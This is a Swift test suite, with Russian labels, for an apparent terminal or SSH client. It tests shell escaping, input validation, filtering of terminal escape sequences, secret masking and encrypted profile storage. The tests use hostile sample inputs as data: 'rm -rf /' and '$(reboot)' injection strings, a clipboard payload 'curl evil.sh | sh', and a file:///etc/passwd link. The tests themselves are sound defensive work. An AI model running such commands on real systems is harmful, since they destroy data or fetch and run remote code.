import CryptoKit
import Foundation
import Testing

@testable import AuthKit
@testable import PhosphorCore
@testable import VaultKit

@Suite("Экранирование и проверка ввода")
struct ShellTests {
    @Test("одиночная кавычка не разрывает строку")
    func quoteEscapesQuotes() {
        #expect(Shell.quote("it's") == #"'it'\''s'"#)
    }

    /// Настоящая проверка экранирования — не сравнение строк, а то, что
    /// настоящий шелл видит ровно один аргумент и не выполняет ничего лишнего.
    @Test(
        "шелл видит один аргумент, что бы в него ни положили",
        arguments: [
            "example.com",
            "it's",
            "example.com'; rm -rf / #",
            "$(reboot)",
            "`id`",
            "a\nb",
            "; touch /tmp/phosphor-should-not-exist",
        ])
    func quoteSurvivesRealShell(_ value: String) throws {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", "printf '%s' \(Shell.quote(value))"]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        #expect(String(decoding: data, as: UTF8.self) == value)
        #expect(!FileManager.default.fileExists(atPath: "/tmp/phosphor-should-not-exist"))
    }

    @Test("домен: принимаем нормальные, отвергаем опасные")
    func domainValidation() {
        #expect(Validate.domain("Prod.Example.COM") == "prod.example.com")
        #expect(Validate.domain("a.io") == "a.io")
        #expect(Validate.domain("localhost") == nil)  // без точки
        #expect(Validate.domain("-bad.example.com") == nil)  // дефис в начале
        #expect(Validate.domain("ex ample.com") == nil)  // пробел
        #expect(Validate.domain("evil.com;reboot") == nil)  // инъекция
        #expect(Validate.domain("") == nil)
    }

    @Test("почта проверяется до certbot, а не им")
    func emailValidation() {
        #expect(Validate.email("admin@example.com") == "admin@example.com")
        #expect(Validate.email("no-at-sign") == nil)
        #expect(Validate.email("a@b") == nil)
        #expect(Validate.email("a b@example.com") == nil)
    }
}

@Suite("Защита от escape-последовательностей")
struct AnsiGuardTests {
    private func run(_ text: String) -> AnsiGuard.Output {
        var guardian = AnsiGuard()
        return guardian.filter(Array(text.utf8))
    }

    @Test("обычный текст проходит без изменений")
    func plainTextPasses() {
        let output = run("hello \u{1B}[31mred\u{1B}[0m")
        #expect(String(decoding: output.bytes, as: UTF8.self) == "hello \u{1B}[31mred\u{1B}[0m")
        #expect(output.requests.isEmpty)
    }

    @Test("OSC 52 не пишет в буфер сам, а спрашивает")
    func clipboardIsIntercepted() {
        let payload = Data("curl evil.sh | sh".utf8).base64EncodedString()
        let output = run("\u{1B}]52;c;\(payload)\u{07}")
        // Ни одного байта последовательности в потоке к эмулятору.
        #expect(!String(decoding: output.bytes, as: UTF8.self).contains("52"))
        #expect(output.requests == [.clipboardWrite("curl evil.sh | sh")])
    }

    @Test("чтение буфера сервером невозможно")
    func clipboardReadIsDropped() {
        let output = run("\u{1B}]52;c;?\u{07}")
        #expect(output.requests.isEmpty)
        #expect(output.bytes.isEmpty)
    }

    @Test("запросы отчёта не доходят до эмулятора: он не должен отвечать")
    func reportRequestsAreDropped() {
        // Device Attributes, Device Status Report, window manipulation.
        for sequence in ["\u{1B}[c", "\u{1B}[6n", "\u{1B}[21t"] {
            #expect(run(sequence).bytes.isEmpty, "прошло: \(sequence)")
        }
        // ENQ — классический триггер answerback.
        #expect(run("\u{05}").bytes.isEmpty)
    }

    @Test("DECRQSS проглатывается целиком")
    func decrqssSwallowed() {
        let output = run("A\u{1B}P$qm\u{1B}\\B")
        #expect(String(decoding: output.bytes, as: UTF8.self) == "AB")
    }

    @Test("ссылка file:// не становится кликабельной")
    func unsafeLinkIntercepted() {
        let output = run("\u{1B}]8;;file:///etc/passwd\u{1B}\\текст")
        #expect(output.requests == [.unsafeLink("file:///etc/passwd")])
        #expect(String(decoding: output.bytes, as: UTF8.self) == "текст")
    }

    @Test("http-ссылка проходит")
    func safeLinkPasses() {
        let output = run("\u{1B}]8;;https://example.com\u{1B}\\ссылка")
        #expect(output.requests.isEmpty)
        #expect(String(decoding: output.bytes, as: UTF8.self).contains("https://example.com"))
    }

    @Test("заголовок окна из потока игнорируется")
    func titleIsDropped() {
        let output = run("\u{1B}]0;prod-01 (на самом деле нет)\u{07}хвост")
        #expect(String(decoding: output.bytes, as: UTF8.self) == "хвост")
    }

    @Test("гигантский параметр обрезается, а не вешает отрисовку")
    func hugeParameterClamped() {
        let output = run("\u{1B}[99999999b")
        let text = String(decoding: output.bytes, as: UTF8.self)
        #expect(text == "\u{1B}[65535b")
    }

    @Test("последовательность, разорванная между чтениями, всё равно ловится")
    func splitAcrossChunks() {
        var guardian = AnsiGuard()
        let payload = Data("два чтения".utf8).base64EncodedString()
        let whole = Array("\u{1B}]52;c;\(payload)\u{07}".utf8)
        let first = guardian.filter(Array(whole[0..<6]))
        let second = guardian.filter(Array(whole[6...]))
        #expect(first.requests.isEmpty)
        #expect(second.requests == [.clipboardWrite("два чтения")])
    }
}

@Suite("Маскирование секретов")
struct RedactionTests {
    @Test("узнаём секреты по имени переменной")
    func detectsSecrets() {
        #expect(Redaction.isSecret(name: "DATABASE_PASSWORD"))
        #expect(Redaction.isSecret(name: "api_key"))
        #expect(Redaction.isSecret(name: "GITHUB_TOKEN"))
        #expect(!Redaction.isSecret(name: "NODE_ENV"))
        #expect(!Redaction.isSecret(name: "CONCURRENCY"))
    }

    @Test("значение секрета не выживает")
    func masksValues() {
        let masked = Redaction.apply(to: [("NODE_ENV", "production"), ("API_KEY", "sk-live-4471")])
        #expect(masked[0].value == "production")
        #expect(masked[1].value == Redaction.mask)
        #expect(!masked.contains { $0.value.contains("sk-live") })
    }
}

@Suite("Шифрованный профиль")
struct VaultTests {
    @Test("круговой путь: зашифровали, расшифровали, то же самое")
    func roundTrip() throws {
        let vault = Vault(key: Vault.generateKey())
        let payload = Data("хосты и ключи".utf8)
        let sealed = try vault.seal(payload)
        #expect(try vault.open(sealed) == payload)
    }

    @Test("чужим ключом не открывается")
    func wrongKeyFails() throws {
        let sealed = try Vault(key: Vault.generateKey()).seal(Data("секрет".utf8))
        #expect(throws: VaultError.cannotDecrypt) {
            try Vault(key: Vault.generateKey()).open(sealed)
        }
    }

    @Test("подмена байта ломает проверку подлинности")
    func tamperingDetected() throws {
        let vault = Vault(key: Vault.generateKey())
        var sealed = try vault.seal(Data("данные".utf8))
        sealed[sealed.count - 1] ^= 0x01
        #expect(throws: VaultError.cannotDecrypt) { try vault.open(sealed) }
    }

    @Test("версия схемы читается без ключа")
    func versionIsPlain() throws {
        let sealed = try Vault(key: Vault.generateKey()).seal(Data("x".utf8))
        #expect(try Vault.version(of: sealed) == Vault.currentVersion)
    }

    @Test("обрезанный файл — понятная ошибка, а не «не расшифровывается»")
    func truncatedIsRecognised() throws {
        #expect(throws: VaultError.truncated) { try Vault.version(of: Data([0x50, 0x48])) }
        #expect(throws: VaultError.notAProfile) {
            try Vault.version(of: Data([0x00, 0x01, 0x02, 0x03, 0x00, 0x01]))
        }
    }

    @Test("будущую версию не пытаемся открыть")
    func futureVersionRefused() throws {
        let vault = Vault(key: Vault.generateKey())
        let sealed = try vault.seal(Data("x".utf8), version: 99)
        #expect(throws: VaultError.unsupportedVersion(99)) { try vault.open(sealed) }
    }

    @Test("атомарная запись не оставляет мусора и ставит права 600")
    func atomicWrite() throws {
        let directory = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("phosphor-test-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: directory) }
        let file = directory.appendingPathComponent("profile.phosphor")

        try AtomicFile.write(Data("первая версия".utf8), to: file)
        try AtomicFile.write(Data("вторая версия".utf8), to: file)

        #expect(try Data(contentsOf: file) == Data("вторая версия".utf8))
        let contents = try FileManager.default.contentsOfDirectory(atPath: directory.path)
        #expect(contents == ["profile.phosphor"], "остались временные файлы: \(contents)")

        let attributes = try FileManager.default.attributesOfItem(atPath: file.path)
        #expect((attributes[.posixPermissions] as? NSNumber)?.int16Value == 0o600)
    }
}

@Suite("Хранилище профиля")
struct ProfileStoreTests {
    private struct Sample: Codable, Equatable {
        var hosts: [String]
        var note: String
    }

    private func temporaryURL() -> URL {
        URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("phosphor-\(UUID().uuidString)/profile.phosphor")
    }

    @Test("первый запуск: профиля нет, ключ создаётся при записи")
    func firstRun() async throws {
        let url = temporaryURL()
        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
        let secrets = MemorySecretStore()
        let store = ProfileStore(store: secrets, url: url)

        #expect(await !store.hasProfile())
        await #expect(throws: ProfileStoreError.empty) {
            _ = try await store.load(Sample.self, reason: "тест")
        }

        let value = Sample(hosts: ["prod-01"], note: "первый")
        try await store.save(value, reason: "тест")
        #expect(await store.hasProfile())
        #expect(
            await secrets.exists(ProfileStore.masterKeyAccount), "ключ должен появиться при первой записи")
        let loaded = try await store.load(Sample.self, reason: "тест")
        #expect(loaded == value)
    }

    @Test("на диске лежит шифротекст, а не JSON")
    func fileIsEncrypted() async throws {
        let url = temporaryURL()
        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
        let store = ProfileStore(store: MemorySecretStore(), url: url)
        try await store.save(Sample(hosts: ["секретный-хост"], note: "x"), reason: "тест")

        let raw = try Data(contentsOf: url)
        let text = String(decoding: raw, as: UTF8.self)
        #expect(!text.contains("секретный-хост"))
        #expect(!text.contains("hosts"))
        #expect(try Vault.version(of: raw) == Vault.currentVersion)
    }

    @Test("потерянный ключ не подменяется новым молча")
    func lostKeyIsReported() async throws {
        let url = temporaryURL()
        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
        let secrets = MemorySecretStore()
        let store = ProfileStore(store: secrets, url: url)
        try await store.save(Sample(hosts: ["a"], note: "b"), reason: "тест")

        // Ключ пропал, файл остался — второе хранилище видит именно это.
        let orphan = ProfileStore(store: MemorySecretStore(), url: url)
        await #expect(throws: ProfileStoreError.keyLost) {
            _ = try await orphan.load(Sample.self, reason: "тест")
        }
    }

    @Test("экспорт под парольной фразой переносится на другую машину")
    func exportAndImport() async throws {
        let source = temporaryURL()
        let target = temporaryURL()
        defer {
            try? FileManager.default.removeItem(at: source.deletingLastPathComponent())
            try? FileManager.default.removeItem(at: target.deletingLastPathComponent())
        }
        let value = Sample(hosts: ["prod-01", "prod-02"], note: "перенос")
        let first = ProfileStore(store: MemorySecretStore(), url: source)
        try await first.save(value, reason: "тест")

        let bundle = try await first.export(passphrase: "длинная фраза", reason: "тест")
        let second = ProfileStore(store: MemorySecretStore(), url: target)
        try await second.importProfile(bundle, passphrase: "длинная фраза", reason: "тест")
        #expect(try await second.load(Sample.self, reason: "тест") == value)
    }

    @Test("неверная фраза не открывает экспорт")
    func wrongPassphrase() async throws {
        let source = temporaryURL()
        let target = temporaryURL()
        defer {
            try? FileManager.default.removeItem(at: source.deletingLastPathComponent())
            try? FileManager.default.removeItem(at: target.deletingLastPathComponent())
        }
        let first = ProfileStore(store: MemorySecretStore(), url: source)
        try await first.save(Sample(hosts: ["a"], note: "b"), reason: "тест")
        let bundle = try await first.export(passphrase: "правильная", reason: "тест")

        let second = ProfileStore(store: MemorySecretStore(), url: target)
        await #expect(throws: VaultError.cannotDecrypt) {
            try await second.importProfile(bundle, passphrase: "неправильная", reason: "тест")
        }
    }

    @Test("уничтожение стирает и файл, и ключ")
    func destroy() async throws {
        let url = temporaryURL()
        let secrets = MemorySecretStore()
        let store = ProfileStore(store: secrets, url: url)
        try await store.save(Sample(hosts: ["a"], note: "b"), reason: "тест")
        try await store.destroy()
        #expect(await !store.hasProfile())
        #expect(await !secrets.exists(ProfileStore.masterKeyAccount))
    }
}
